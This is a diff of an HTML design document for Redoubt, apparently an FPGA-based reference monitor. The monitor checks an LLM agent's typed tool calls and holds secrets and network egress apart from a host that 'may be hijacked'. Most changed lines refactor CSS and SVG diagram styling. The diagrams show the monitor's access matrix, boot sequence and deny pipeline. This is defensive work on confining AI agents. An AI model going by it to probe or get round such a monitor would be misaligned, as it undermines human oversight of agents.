@@ -5,22 +5,24 @@
 <style>
   :root{
     --bg:#F5F7F9; --surface:#FFFFFF; --surface-2:#EEF1F5; --ink:#14171C; --muted:#586274;
-    --line:#D7DDE5; --accent:#0E7C86; --accent-soft:#0E7C8618;
-    --allow:#1F7A46; --deny:#B3261E; --warn:#9A6700;
+    --line:#C6CDD8; --accent:#0E7C86; --accent-soft:#0E7C8618;
+    --allow:#1F7A46; --deny:#B3261E; --warn:#8A5A00;
     --code-bg:#EEF1F5; --code-ink:#1F2530;
     --sans:"IBM Plex Sans",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
     --disp:"Archivo","IBM Plex Sans",sans-serif;
     --mono:"IBM Plex Mono",ui-monospace,"SF Mono",Menlo,monospace;
   }
-  :root:not([data-theme="light"]){ @media (prefers-color-scheme:dark){
-    --bg:#0B0E13; --surface:#131922; --surface-2:#0F141C; --ink:#E7ECF2; --muted:#95A2B4;
-    --line:#232C38; --accent:#3EC3CE; --accent-soft:#3EC3CE1A;
-    --allow:#57C684; --deny:#F26A5E; --warn:#E0A64A;
-    --code-bg:#0E141D; --code-ink:#CFD8E3;
-  }}
+  @media (prefers-color-scheme:dark){
+    :root:not([data-theme="light"]){
+      --bg:#0B0E13; --surface:#131922; --surface-2:#0F141C; --ink:#E7ECF2; --muted:#95A2B4;
+      --line:#2C3745; --accent:#3EC3CE; --accent-soft:#3EC3CE1E;
+      --allow:#57C684; --deny:#F26A5E; --warn:#E0A64A;
+      --code-bg:#0E141D; --code-ink:#CFD8E3;
+    }
+  }
   :root[data-theme="dark"]{
     --bg:#0B0E13; --surface:#131922; --surface-2:#0F141C; --ink:#E7ECF2; --muted:#95A2B4;
-    --line:#232C38; --accent:#3EC3CE; --accent-soft:#3EC3CE1A;
+    --line:#2C3745; --accent:#3EC3CE; --accent-soft:#3EC3CE1E;
     --allow:#57C684; --deny:#F26A5E; --warn:#E0A64A;
     --code-bg:#0E141D; --code-ink:#CFD8E3;
   }
@@ -86,10 +88,15 @@
   .ref li{margin:.35rem 0}
   footer{margin:3rem 0 2rem;padding-top:1rem;border-top:1px solid var(--line);
          font-size:.82rem;color:var(--muted)}
-  .kbd{font-family:var(--mono);font-size:.8em;border:1px solid var(--line);border-bottom-width:2px;
-       border-radius:4px;padding:.05em .4em;background:var(--surface)}
-  svg text{font-family:var(--mono);fill:currentColor}
-  .swatch{width:.7em;height:.7em;display:inline-block;border-radius:2px;vertical-align:baseline}
+
+  /* ---- diagram styling: CSS (var() works here), never SVG presentation attrs ---- */
+  figure svg text{fill:currentColor}
+  .f-s1{fill:var(--surface)} .f-s2{fill:var(--surface-2)} .f-acc{fill:var(--accent-soft)} .f-none{fill:none}
+  .s-ln{stroke:var(--line)} .s-acc{stroke:var(--accent)} .s-den{stroke:var(--deny)}
+  .s-al{stroke:var(--allow)} .s-mut{stroke:var(--muted)} .s-cur{stroke:currentColor}
+  .t-acc{fill:var(--accent)} .t-mut{fill:var(--muted)} .t-den{fill:var(--deny)}
+  .t-warn{fill:var(--warn)} .t-al{fill:var(--allow)}
+  .mk{fill:currentColor} .mk-acc{fill:var(--accent)} .mk-den{fill:var(--deny)} .mk-al{fill:var(--allow)}
 </style>
 
 <div class="wrap">
@@ -170,54 +177,44 @@ Redoubt a <em>structured request</em>; Redoubt decides, then acts.</p>
 <svg viewBox="0 0 900 300" role="img" aria-label="System topology: an untrusted host sends typed tool-call requests over USB to Redoubt on the FPGA, whose M-mode Monitor is the only component that touches network and storage egress and holds secrets.">
   <defs>
     <marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
-      <path d="M0 0 L10 5 L0 10 z" fill="currentColor"/>
-    </marker>
+      <path d="M0 0 L10 5 L0 10 z" class="mk"/></marker>
     <marker id="ahA" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
-      <path d="M0 0 L10 5 L0 10 z" fill="var(--accent)"/>
-    </marker>
+      <path d="M0 0 L10 5 L0 10 z" class="mk-acc"/></marker>
   </defs>
-  <!-- HOST -->
-  <rect x="14" y="70" width="200" height="150" rx="10" fill="none" stroke="var(--deny)" stroke-width="1.5"/>
-  <text x="114" y="60" text-anchor="middle" font-size="12" fill="var(--deny)">HOST — untrusted</text>
+  <rect x="14" y="70" width="200" height="150" rx="10" class="f-none s-den" stroke-width="1.5"/>
+  <text x="114" y="60" text-anchor="middle" font-size="12" class="t-den">HOST — untrusted</text>
   <text x="114" y="112" text-anchor="middle" font-size="12">LLM</text>
   <text x="114" y="140" text-anchor="middle" font-size="12">agent loop</text>
   <text x="114" y="168" text-anchor="middle" font-size="12">tool shims</text>
-  <text x="114" y="196" text-anchor="middle" font-size="10" fill="var(--muted)">(may be hijacked)</text>
-  <!-- boundary -->
-  <line x1="250" y1="30" x2="250" y2="270" stroke="var(--muted)" stroke-width="1" stroke-dasharray="3 4"/>
-  <text x="250" y="24" text-anchor="middle" font-size="9" fill="var(--muted)">physical boundary</text>
-  <!-- req arrow -->
-  <line x1="214" y1="130" x2="300" y2="130" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah)"/>
+  <text x="114" y="196" text-anchor="middle" font-size="10" class="t-mut">(may be hijacked)</text>
+  <line x1="250" y1="30" x2="250" y2="270" class="s-mut" stroke-width="1" stroke-dasharray="3 4"/>
+  <text x="250" y="24" text-anchor="middle" font-size="9" class="t-mut">physical boundary</text>
+  <line x1="214" y1="130" x2="300" y2="130" class="s-cur" stroke-width="1.5" marker-end="url(#ah)"/>
   <text x="257" y="122" text-anchor="middle" font-size="9">tool-call</text>
-  <text x="257" y="146" text-anchor="middle" font-size="9" fill="var(--muted)">USB CDC-ACM</text>
-  <!-- REDOUBT stack -->
-  <rect x="300" y="40" width="330" height="230" rx="12" fill="none" stroke="var(--line)" stroke-width="1.5"/>
-  <text x="465" y="30" text-anchor="middle" font-size="12" fill="var(--muted)">REDOUBT · ULX3S (ECP5)</text>
-  <rect x="320" y="58" width="290" height="40" rx="7" fill="var(--surface-2)" stroke="var(--line)"/>
+  <text x="257" y="146" text-anchor="middle" font-size="9" class="t-mut">USB CDC-ACM</text>
+  <rect x="300" y="40" width="330" height="230" rx="12" class="f-none s-ln" stroke-width="1.5"/>
+  <text x="465" y="30" text-anchor="middle" font-size="12" class="t-mut">REDOUBT · ULX3S (ECP5)</text>
+  <rect x="320" y="58" width="290" height="40" rx="7" class="f-s2 s-ln"/>
   <text x="330" y="83" font-size="11">ENDPOINT</text>
-  <text x="600" y="83" text-anchor="end" font-size="10" fill="var(--muted)">U · T2</text>
-  <rect x="320" y="106" width="290" height="40" rx="7" fill="var(--surface-2)" stroke="var(--line)"/>
+  <text x="600" y="83" text-anchor="end" font-size="10" class="t-mut">U · T2</text>
+  <rect x="320" y="106" width="290" height="40" rx="7" class="f-s2 s-ln"/>
   <text x="330" y="131" font-size="11">WARDEN — sched / IPC</text>
-  <text x="600" y="131" text-anchor="end" font-size="10" fill="var(--warn)">S · T1</text>
-  <rect x="320" y="154" width="290" height="96" rx="7" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
-  <text x="330" y="176" font-size="12" fill="var(--accent)" font-weight="600">REDOUBT MONITOR</text>
-  <text x="600" y="176" text-anchor="end" font-size="10" fill="var(--accent)">M · T0 · TCB</text>
+  <text x="600" y="131" text-anchor="end" font-size="10" class="t-warn">S · T1</text>
+  <rect x="320" y="154" width="290" height="96" rx="7" class="f-acc s-acc" stroke-width="2"/>
+  <text x="330" y="176" font-size="12" font-weight="600" class="t-acc">REDOUBT MONITOR</text>
+  <text x="600" y="176" text-anchor="end" font-size="10" class="t-acc">M · T0 · TCB</text>
   <text x="330" y="198" font-size="10">caps · arg predicates · IFC labels</text>
   <text x="330" y="216" font-size="10">secrets store · policy · TRNG</text>
-  <text x="330" y="238" font-size="10" fill="var(--accent)">owns egress MMIO (PMP-locked)</text>
-  <!-- ecall arrows within -->
-  <line x1="465" y1="98" x2="465" y2="106" stroke="currentColor" stroke-width="1.2" marker-end="url(#ah)"/>
-  <text x="475" y="103" font-size="8" fill="var(--muted)">ecall</text>
-  <!-- egress -->
-  <line x1="630" y1="200" x2="716" y2="200" stroke="var(--accent)" stroke-width="1.8" marker-end="url(#ahA)"/>
-  <text x="673" y="192" text-anchor="middle" font-size="9" fill="var(--accent)">perform</text>
-  <text x="673" y="214" text-anchor="middle" font-size="8" fill="var(--muted)">+inject secret</text>
-  <rect x="716" y="120" width="170" height="60" rx="8" fill="none" stroke="var(--line)"/>
-  <text x="801" y="145" text-anchor="middle" font-size="11">ESP32 · network</text>
-  <text x="801" y="166" text-anchor="middle" font-size="11">microSD · storage</text>
-  <line x1="801" y1="180" x2="801" y2="120"/>
-  <text x="801" y="196" text-anchor="middle" font-size="9" fill="var(--muted)">EGRESS</text>
-  <line x1="716" y1="200" x2="716" y2="150" stroke="var(--line)" stroke-width="0"/>
+  <text x="330" y="238" font-size="10" class="t-acc">owns egress MMIO (PMP-locked)</text>
+  <line x1="465" y1="98" x2="465" y2="106" class="s-cur" stroke-width="1.2" marker-end="url(#ah)"/>
+  <text x="476" y="103" font-size="8" class="t-mut">ecall</text>
+  <line x1="630" y1="205" x2="710" y2="205" class="s-acc" stroke-width="1.8" marker-end="url(#ahA)"/>
+  <text x="670" y="197" text-anchor="middle" font-size="9" class="t-acc">perform</text>
+  <text x="670" y="222" text-anchor="middle" font-size="8" class="t-mut">+ inject secret</text>
+  <rect x="716" y="176" width="170" height="74" rx="8" class="f-none s-ln"/>
+  <text x="801" y="168" text-anchor="middle" font-size="9" class="t-mut">EGRESS (owned by Monitor)</text>
+  <text x="801" y="208" text-anchor="middle" font-size="11">ESP32 · network</text>
+  <text x="801" y="232" text-anchor="middle" font-size="11">microSD · storage</text>
 </svg>
 <figcaption><b>Figure 1 — System topology.</b> The agent runs on the untrusted host and can only
 <em>ask</em>. The <span class="tier t0">M · T0</span> Monitor is the sole component that touches
@@ -280,7 +277,7 @@ reference-monitor guarantee [1] instantiated for a typed tool call and a hijacka
 <h4>Out of scope (v1) — stated, not hidden</h4>
 <ul class="tight muted">
   <li>Microarchitectural / timing side channels [9]; physical &amp; fault-injection attacks [10].</li>
-  <li>FPGA bitstream authenticity (a v2 root-of-trust concern) and ESP32 firmware integrity (§11.1).</li>
+  <li>FPGA bitstream authenticity (a v2 root-of-trust concern) and ESP32 firmware integrity (§11).</li>
   <li>Host-side poisoning of the agent's own memory; multi-agent collusion; agent self-DoS.</li>
 </ul>
 </section>
@@ -312,61 +309,49 @@ protected regions with PMP, reconfiguring on entry [4][5].</p>
 </div>
 
 <figure>
-<svg viewBox="0 0 860 320" role="img" aria-label="PMP access matrix. Monitor code and data, the secrets store, and egress MMIO are readable and writable only by M-mode; Warden by S; compartments by their own U region; the shared request buffer by M and the endpoint. Secrets and egress rows are marked machine-only.">
-  <!-- columns -->
-  <text x="470" y="26" text-anchor="middle" font-size="11" fill="var(--muted)">M-mode (T0)</text>
-  <text x="600" y="26" text-anchor="middle" font-size="11" fill="var(--warn)">S-mode (T1)</text>
-  <text x="730" y="26" text-anchor="middle" font-size="11" fill="var(--muted)">U-mode (T2)</text>
-  <line x1="30" y1="34" x2="820" y2="34" stroke="var(--line)"/>
-  <!-- rows -->
+<svg viewBox="0 0 860 316" role="img" aria-label="PMP access matrix. Monitor code and data, the secrets store, and egress MMIO are readable and writable only by M-mode; Warden by S; compartments by their own U region; the shared request buffer by M and the endpoint. Secrets and egress rows are marked machine-only.">
+  <text x="470" y="26" text-anchor="middle" font-size="11" class="t-acc">M-mode (T0)</text>
+  <text x="600" y="26" text-anchor="middle" font-size="11" class="t-warn">S-mode (T1)</text>
+  <text x="730" y="26" text-anchor="middle" font-size="11" class="t-mut">U-mode (T2)</text>
+  <line x1="30" y1="34" x2="820" y2="34" class="s-ln"/>
+  <rect x="30" y="128" width="790" height="28" class="f-acc"/>
+  <rect x="30" y="156" width="790" height="28" class="f-acc"/>
   <g font-size="11">
-    <!-- helper positions -->
-    <!-- row template: label at x=40, cells centered at 470/600/730 -->
-    <!-- BROM -->
     <text x="40" y="62">BROM (measured boot)</text>
-    <text x="470" y="62" text-anchor="middle" fill="var(--accent)">R X</text>
-    <text x="600" y="62" text-anchor="middle" fill="var(--muted)">·</text>
-    <text x="730" y="62" text-anchor="middle" fill="var(--muted)">·</text>
-    <!-- MON_CODE -->
+    <text x="470" y="62" text-anchor="middle" class="t-acc">R X</text>
+    <text x="600" y="62" text-anchor="middle" class="t-mut">·</text>
+    <text x="730" y="62" text-anchor="middle" class="t-mut">·</text>
     <text x="40" y="90">MON_CODE</text>
-    <text x="470" y="90" text-anchor="middle" fill="var(--accent)">R X</text>
-    <text x="600" y="90" text-anchor="middle" fill="var(--muted)">·</text>
-    <text x="730" y="90" text-anchor="middle" fill="var(--muted)">·</text>
-    <!-- MON_DATA -->
+    <text x="470" y="90" text-anchor="middle" class="t-acc">R X</text>
+    <text x="600" y="90" text-anchor="middle" class="t-mut">·</text>
+    <text x="730" y="90" text-anchor="middle" class="t-mut">·</text>
     <text x="40" y="118">MON_DATA (caps · policy · log)</text>
-    <text x="470" y="118" text-anchor="middle" fill="var(--accent)">R W</text>
-    <text x="600" y="118" text-anchor="middle" fill="var(--muted)">·</text>
-    <text x="730" y="118" text-anchor="middle" fill="var(--muted)">·</text>
-    <!-- SECRETS -->
-    <rect x="30" y="128" width="790" height="28" fill="var(--accent-soft)"/>
+    <text x="470" y="118" text-anchor="middle" class="t-acc">R W</text>
+    <text x="600" y="118" text-anchor="middle" class="t-mut">·</text>
+    <text x="730" y="118" text-anchor="middle" class="t-mut">·</text>
     <text x="40" y="147">SECRETS</text>
-    <text x="470" y="147" text-anchor="middle" fill="var(--accent)">R W</text>
-    <text x="600" y="147" text-anchor="middle" fill="var(--deny)">✗</text>
-    <text x="730" y="147" text-anchor="middle" fill="var(--deny)">✗</text>
-    <!-- EGRESS -->
-    <rect x="30" y="156" width="790" height="28" fill="var(--accent-soft)"/>
+    <text x="470" y="147" text-anchor="middle" class="t-acc">R W</text>
+    <text x="600" y="147" text-anchor="middle" class="t-den">✗</text>
+    <text x="730" y="147" text-anchor="middle" class="t-den">✗</text>
     <text x="40" y="175">EGRESS_MMIO (ESP32 · SD · TRNG)</text>
-    <text x="470" y="175" text-anchor="middle" fill="var(--accent)">R W</text>
-    <text x="600" y="175" text-anchor="middle" fill="var(--deny)">✗</text>
-    <text x="730" y="175" text-anchor="middle" fill="var(--deny)">✗</text>
-    <!-- WARDEN -->
+    <text x="470" y="175" text-anchor="middle" class="t-acc">R W</text>
+    <text x="600" y="175" text-anchor="middle" class="t-den">✗</text>
+    <text x="730" y="175" text-anchor="middle" class="t-den">✗</text>
     <text x="40" y="203">WARDEN</text>
-    <text x="470" y="203" text-anchor="middle" fill="var(--muted)">R W</text>
-    <text x="600" y="203" text-anchor="middle" fill="var(--warn)">R W X</text>
-    <text x="730" y="203" text-anchor="middle" fill="var(--deny)">✗</text>
-    <!-- COMPT -->
+    <text x="470" y="203" text-anchor="middle" class="t-mut">R W</text>
+    <text x="600" y="203" text-anchor="middle" class="t-warn">R W X</text>
+    <text x="730" y="203" text-anchor="middle" class="t-den">✗</text>
     <text x="40" y="231">COMPT_k (per compartment)</text>
-    <text x="470" y="231" text-anchor="middle" fill="var(--muted)">R W</text>
-    <text x="600" y="231" text-anchor="middle" fill="var(--muted)">·</text>
-    <text x="730" y="231" text-anchor="middle" fill="var(--muted)">R W (own)</text>
-    <!-- SHARED_REQ -->
+    <text x="470" y="231" text-anchor="middle" class="t-mut">R W</text>
+    <text x="600" y="231" text-anchor="middle" class="t-mut">·</text>
+    <text x="730" y="231" text-anchor="middle">R W (own)</text>
     <text x="40" y="259">SHARED_REQ buffer</text>
-    <text x="470" y="259" text-anchor="middle" fill="var(--muted)">R W</text>
-    <text x="600" y="259" text-anchor="middle" fill="var(--muted)">·</text>
-    <text x="730" y="259" text-anchor="middle" fill="var(--muted)">R W</text>
+    <text x="470" y="259" text-anchor="middle" class="t-mut">R W</text>
+    <text x="600" y="259" text-anchor="middle" class="t-mut">·</text>
+    <text x="730" y="259" text-anchor="middle">R W</text>
   </g>
-  <line x1="30" y1="270" x2="820" y2="270" stroke="var(--line)"/>
-  <text x="30" y="294" font-size="10" fill="var(--muted)">Highlighted rows: reachable only from M-mode — enforced by PMP (Smepmp / locked), set before T1/T2 run.</text>
+  <line x1="30" y1="272" x2="820" y2="272" class="s-ln"/>
+  <text x="30" y="296" font-size="10" class="t-mut">Highlighted rows: reachable only from M-mode — enforced by PMP (Smepmp / locked), set before T1/T2 run.</text>
 </svg>
 <figcaption><b>Figure 2 — PMP access matrix.</b> The two rows that carry all the risk — the
 <b>secrets store</b> and <b>egress MMIO</b> — are physically unreachable from S- and U-mode. That
@@ -385,20 +370,20 @@ Monitor we're about to trust the one we intended?</em> A tiny measured-boot ROM 
 Monitor locks down the hardware while it still has sole control.</p></div>
 <figure>
 <svg viewBox="0 0 880 150" role="img" aria-label="Boot sequence: ECP5 loads bitstream from QSPI, BROM measures the Monitor image with BLAKE2s and halts on mismatch, the Monitor locks PMP and initializes secrets and TRNG, then mret to Warden which starts the user compartments.">
-  <defs><marker id="ah2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="currentColor"/></marker></defs>
+  <defs><marker id="ah2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk"/></marker></defs>
   <g font-size="10">
-    <rect x="8"  y="40" width="140" height="56" rx="8" fill="var(--surface-2)" stroke="var(--line)"/>
+    <rect x="8"  y="40" width="140" height="56" rx="8" class="f-s2 s-ln"/>
     <text x="78" y="62" text-anchor="middle">ECP5 loads</text><text x="78" y="78" text-anchor="middle">bitstream (QSPI)</text>
-    <rect x="188" y="40" width="150" height="56" rx="8" fill="var(--surface-2)" stroke="var(--line)"/>
-    <text x="263" y="60" text-anchor="middle">BROM measures</text><text x="263" y="75" text-anchor="middle">MON via BLAKE2s</text><text x="263" y="90" text-anchor="middle" fill="var(--deny)">≠ H → halt</text>
-    <rect x="378" y="34" width="170" height="68" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.6"/>
-    <text x="463" y="54" text-anchor="middle" fill="var(--accent)">MONITOR runs</text><text x="463" y="70" text-anchor="middle">lock PMP entries</text><text x="463" y="85" text-anchor="middle">init secrets · TRNG</text><text x="463" y="99" text-anchor="middle">compile policy</text>
-    <rect x="588" y="40" width="130" height="56" rx="8" fill="var(--surface-2)" stroke="var(--line)"/>
+    <rect x="188" y="40" width="150" height="56" rx="8" class="f-s2 s-ln"/>
+    <text x="263" y="60" text-anchor="middle">BROM measures</text><text x="263" y="75" text-anchor="middle">MON via BLAKE2s</text><text x="263" y="90" text-anchor="middle" class="t-den">≠ H → halt</text>
+    <rect x="378" y="34" width="170" height="68" rx="8" class="f-acc s-acc" stroke-width="1.6"/>
+    <text x="463" y="54" text-anchor="middle" class="t-acc">MONITOR runs</text><text x="463" y="70" text-anchor="middle">lock PMP entries</text><text x="463" y="85" text-anchor="middle">init secrets · TRNG</text><text x="463" y="99" text-anchor="middle">compile policy</text>
+    <rect x="588" y="40" width="130" height="56" rx="8" class="f-s2 s-ln"/>
     <text x="653" y="62" text-anchor="middle">mret → WARDEN</text><text x="653" y="78" text-anchor="middle">(S-mode)</text>
-    <rect x="748" y="40" width="124" height="56" rx="8" fill="var(--surface-2)" stroke="var(--line)"/>
+    <rect x="748" y="40" width="124" height="56" rx="8" class="f-s2 s-ln"/>
     <text x="810" y="62" text-anchor="middle">start U-mode</text><text x="810" y="78" text-anchor="middle">compartments</text>
   </g>
-  <g stroke="currentColor" stroke-width="1.4" marker-end="url(#ah2)">
+  <g class="s-cur" stroke-width="1.4" marker-end="url(#ah2)">
     <line x1="148" y1="68" x2="186" y2="68"/><line x1="338" y1="68" x2="376" y2="68"/>
     <line x1="548" y1="68" x2="586" y2="68"/><line x1="718" y1="68" x2="746" y2="68"/>
   </g>
@@ -429,59 +414,49 @@ ecall-from-U raises mcause=8 → M-mode trap dispatches on a7. No ecall reads
 SECRETS or drives EGRESS directly; those happen only inside step 6.</code></pre>
 
 <figure>
-<svg viewBox="0 0 720 470" role="img" aria-label="Monitor decision pipeline. A request passes six sequential checks — bounds/format, capability resolution, tool binding, typed-argument predicate, information-flow, then perform-and-inject — each failure branching right to a specific DENY reason code; success reaches ALLOW.">
-  <defs><marker id="ahd" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="currentColor"/></marker>
-        <marker id="ahr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="var(--deny)"/></marker></defs>
-  <!-- request -->
-  <rect x="70" y="14" width="260" height="34" rx="8" fill="var(--surface-2)" stroke="var(--line)"/>
-  <text x="200" y="35" text-anchor="middle" font-size="11">Request {session, cap_handle, tool_id, args[], labels[]}</text>
-  <g font-size="11">
-  <!-- steps -->
-  <!-- template y: 66,124,182,240,298,356 -->
-  <g>
-    <rect x="90" y="66" width="220" height="36" rx="7" fill="var(--surface)" stroke="var(--line)"/>
-    <text x="104" y="88" font-size="10">1 · bounds / format</text>
-    <line x1="310" y1="84" x2="470" y2="84" stroke="var(--deny)" stroke-width="1.3" marker-end="url(#ahr)"/>
-    <text x="500" y="88" font-size="10" fill="var(--deny)">DENY_MALFORMED</text>
+<svg viewBox="0 0 720 476" role="img" aria-label="Monitor decision pipeline. A request passes six sequential checks — bounds/format, capability resolution, tool binding, typed-argument predicate, information-flow, then perform-and-inject — each failure branching right to a specific DENY reason code; success reaches ALLOW.">
+  <defs><marker id="ahd" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk"/></marker>
+        <marker id="ahr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk-den"/></marker></defs>
+  <rect x="50" y="14" width="300" height="34" rx="8" class="f-s2 s-ln"/>
+  <text x="200" y="35" text-anchor="middle" font-size="10">Request { session · cap · tool · args · labels }</text>
+  <g font-size="10">
+    <rect x="90" y="66" width="220" height="36" rx="7" class="f-s1 s-ln"/>
+    <text x="104" y="88">1 · bounds / format</text>
+    <line x1="310" y1="84" x2="470" y2="84" class="s-den" stroke-width="1.3" marker-end="url(#ahr)"/>
+    <text x="478" y="88" class="t-den">DENY_MALFORMED</text>
+
+    <rect x="90" y="124" width="220" height="36" rx="7" class="f-s1 s-ln"/>
+    <text x="104" y="146">2 · resolve capability + epoch</text>
+    <line x1="310" y1="142" x2="470" y2="142" class="s-den" stroke-width="1.3" marker-end="url(#ahr)"/>
+    <text x="478" y="146" class="t-den">DENY_NO_CAP / REVOKED</text>
+
+    <rect x="90" y="182" width="220" height="36" rx="7" class="f-s1 s-ln"/>
+    <text x="104" y="204">3 · tool binding</text>
+    <line x1="310" y1="200" x2="470" y2="200" class="s-den" stroke-width="1.3" marker-end="url(#ahr)"/>
+    <text x="478" y="204" class="t-den">DENY_TOOL</text>
+
+    <rect x="90" y="240" width="220" height="36" rx="7" class="f-s1 s-ln"/>
+    <text x="104" y="262">4 · typed-arg predicate</text>
+    <line x1="310" y1="258" x2="470" y2="258" class="s-den" stroke-width="1.3" marker-end="url(#ahr)"/>
+    <text x="478" y="262" class="t-den">DENY_ARG</text>
+
+    <rect x="90" y="298" width="220" height="36" rx="7" class="f-s1 s-ln"/>
+    <text x="104" y="320">5 · information-flow check</text>
+    <line x1="310" y1="316" x2="470" y2="316" class="s-den" stroke-width="1.3" marker-end="url(#ahr)"/>
+    <text x="478" y="320" class="t-den">DENY_FLOW</text>
+
+    <rect x="90" y="356" width="220" height="46" rx="7" class="f-acc s-acc" stroke-width="1.6"/>
+    <text x="104" y="376" class="t-acc">6 · perform on M-owned engine</text>
+    <text x="104" y="392" class="t-acc">+ inject secret · label result</text>
+
+    <rect x="120" y="428" width="160" height="34" rx="8" class="f-none s-al" stroke-width="1.8"/>
+    <text x="200" y="450" text-anchor="middle" font-size="12" class="t-al">ALLOW</text>
   </g>
-  <g>
-    <rect x="90" y="124" width="220" height="36" rx="7" fill="var(--surface)" stroke="var(--line)"/>
-    <text x="104" y="146" font-size="10">2 · resolve capability + epoch</text>
-    <line x1="310" y1="142" x2="470" y2="142" stroke="var(--deny)" stroke-width="1.3" marker-end="url(#ahr)"/>
-    <text x="500" y="146" font-size="10" fill="var(--deny)">DENY_NO_CAP / REVOKED</text>
-  </g>
-  <g>
-    <rect x="90" y="182" width="220" height="36" rx="7" fill="var(--surface)" stroke="var(--line)"/>
-    <text x="104" y="204" font-size="10">3 · tool binding</text>
-    <line x1="310" y1="200" x2="470" y2="200" stroke="var(--deny)" stroke-width="1.3" marker-end="url(#ahr)"/>
-    <text x="500" y="204" font-size="10" fill="var(--deny)">DENY_TOOL</text>
-  </g>
-  <g>
-    <rect x="90" y="240" width="220" height="36" rx="7" fill="var(--surface)" stroke="var(--line)"/>
-    <text x="104" y="262" font-size="10">4 · typed-arg predicate</text>
-    <line x1="310" y1="258" x2="470" y2="258" stroke="var(--deny)" stroke-width="1.3" marker-end="url(#ahr)"/>
-    <text x="500" y="262" font-size="10" fill="var(--deny)">DENY_ARG</text>
-  </g>
-  <g>
-    <rect x="90" y="298" width="220" height="36" rx="7" fill="var(--surface)" stroke="var(--line)"/>
-    <text x="104" y="320" font-size="10">5 · information-flow check</text>
-    <line x1="310" y1="316" x2="470" y2="316" stroke="var(--deny)" stroke-width="1.3" marker-end="url(#ahr)"/>
-    <text x="500" y="320" font-size="10" fill="var(--deny)">DENY_FLOW</text>
-  </g>
-  <g>
-    <rect x="90" y="356" width="220" height="46" rx="7" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.6"/>
-    <text x="104" y="376" font-size="10" fill="var(--accent)">6 · perform on M-owned engine</text>
-    <text x="104" y="392" font-size="10" fill="var(--accent)">+ inject secret · label result</text>
-  </g>
-  <rect x="120" y="424" width="160" height="34" rx="8" fill="none" stroke="var(--allow)" stroke-width="1.8"/>
-  <text x="200" y="446" text-anchor="middle" font-size="12" fill="var(--allow)">ALLOW</text>
-  </g>
-  <!-- down arrows -->
-  <g stroke="currentColor" stroke-width="1.4" marker-end="url(#ahd)">
+  <g class="s-cur" stroke-width="1.4" marker-end="url(#ahd)">
     <line x1="200" y1="48" x2="200" y2="64"/><line x1="200" y1="102" x2="200" y2="122"/>
     <line x1="200" y1="160" x2="200" y2="180"/><line x1="200" y1="218" x2="200" y2="238"/>
     <line x1="200" y1="276" x2="200" y2="296"/><line x1="200" y1="334" x2="200" y2="354"/>
-    <line x1="200" y1="402" x2="200" y2="422"/>
+    <line x1="200" y1="402" x2="200" y2="426"/>
   </g>
 </svg>
 <figcaption><b>Figure 4 — The decision pipeline.</b> Six sequential, bounded checks over compiled
@@ -506,36 +481,33 @@ The model follows seL4's discipline [18][19] but is deliberately <b>flat and fix
 capability-derivation-tree graph, no untyped-retype — to keep the TCB tiny.</p>
 </div>
 <figure>
-<svg viewBox="0 0 860 250" role="img" aria-label="Capability resolution. A host-supplied handle indexes the session's fixed capability-space array of 16-byte slots; a valid slot yields a typed capability with tool binding, predicate, secret and flow references; an out-of-range handle hits an empty slot and denies. Derivation only narrows.">
-  <defs><marker id="ahc" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="currentColor"/></marker></defs>
-  <text x="70" y="30" font-size="11" fill="var(--muted)">handle (from host)</text>
-  <rect x="70" y="40" width="90" height="34" rx="7" fill="var(--surface-2)" stroke="var(--line)"/>
-  <text x="115" y="62" text-anchor="middle" font-size="12">3</text>
-  <line x1="160" y1="57" x2="214" y2="57" stroke="currentColor" stroke-width="1.4" marker-end="url(#ahc)"/>
-  <text x="187" y="50" text-anchor="middle" font-size="9">index</text>
-  <!-- cspace -->
-  <text x="360" y="30" font-size="11" fill="var(--muted)">session.cspace : [Cap; 32]   (all-Empty until policy installs)</text>
+<svg viewBox="0 0 860 244" role="img" aria-label="Capability resolution. A host-supplied handle indexes the session's fixed capability-space array of 16-byte slots; a valid slot yields a typed capability with tool binding, predicate, secret and flow references; an out-of-range handle hits an empty slot and denies. Derivation only narrows.">
+  <defs><marker id="ahc" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" class="mk"/></marker></defs>
+  <text x="70" y="28" font-size="11" class="t-mut">handle (from host)</text>
+  <rect x="70" y="38" width="60" height="30" rx="7" class="f-s2 s-ln"/>
+  <text x="100" y="58" text-anchor="middle" font-size="12">3</text>
+  <line x1="130" y1="53" x2="210" y2="53" class="s-cur" stroke-width="1.4" marker-end="url(#ahc)"/>
+  <text x="170" y="46" text-anchor="middle" font-size="9">index</text>
+  <text x="230" y="28" font-size="10" class="t-mut">session.cspace : [Cap; 32]  (all-Empty until policy installs)</text>
   <g font-size="10">
-    <rect x="214" y="40" width="70" height="34" fill="var(--surface)" stroke="var(--line)"/><text x="249" y="62" text-anchor="middle">0 Empty</text>
-    <rect x="284" y="40" width="70" height="34" fill="var(--surface)" stroke="var(--line)"/><text x="319" y="62" text-anchor="middle">1 Net</text>
-    <rect x="354" y="40" width="70" height="34" fill="var(--surface)" stroke="var(--line)"/><text x="389" y="62" text-anchor="middle">2 File</text>
